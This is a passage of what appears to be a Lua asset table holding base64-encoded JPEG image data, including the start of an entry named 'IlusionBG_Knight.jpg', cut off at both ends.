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U3VbrkE3UqFyCQrKq4ILqQqrkBAVOJUXIL4lN0O6m6C91ZDBVgUVdRdQquCCcSjEqFRdE1dcCqYl10UZslkXEx2oSt1YOQWewh2WipcorZbLn2k9VAElVurlhQyFUddRddZcghddcuQddddQougtdddVuuugsuuq3UXQWupuqXUoLXUXVbrlBcFTdUuuugWupuqKboq9111VddBa666rdddBa6lVXILXUqqlBKlVXILKVVcgsuVbqUFlyhSg5cuXIJXLlyDly5cglSqqUFl11ClUSFcKikKAoKuCggq4KCxChWuquVE3U3VLqboCBTdUupuiL3U3VLqboq11F1W6glBxKqSuJVSUEEqhKklVJQQSq3UkqpKI665QuQddSoXIJXXXLkFlKhcglddQpQTdTdVupugupVLqQVFWsrKgKtdVKm6sCqXUgoohYHIL4y1Ea5FNnR2UCahWIs6yiyo5ddcuUE3U4kMqLqguNVLlS666CSVF1yhBKhRdciOUXXLkHLly5By5cuUEXUqFyKlQuXIJUXULkCylQuQWXKqlBK5QuQWXKFyCy5QuQWXKFyCy5QpQSpVVKCVKhSglcoUoOXLlyCVyhcglcoXIJUqFyCysqKyCwVwUNWCAl1xKgKUELrrioQWBVrqgUoL3XXVQpVE3VSVKqUEEqpKkqhQcSqFSVUojrqCpVSg5cuUIJUqqsg5SoUqKlSoUqjly5coJXLly0iQpVVZQddTdQuQWXXULkFgURrkFWCirSN3VEU+FAVEqpUqEEKpVlCCq5SoRErlChQSoXLkHLly5aHKFKhZVy5cuQcuXLkHKFy5By5QuQf/Z]],
  ["IlusionBG_Knight.jpg"] = [[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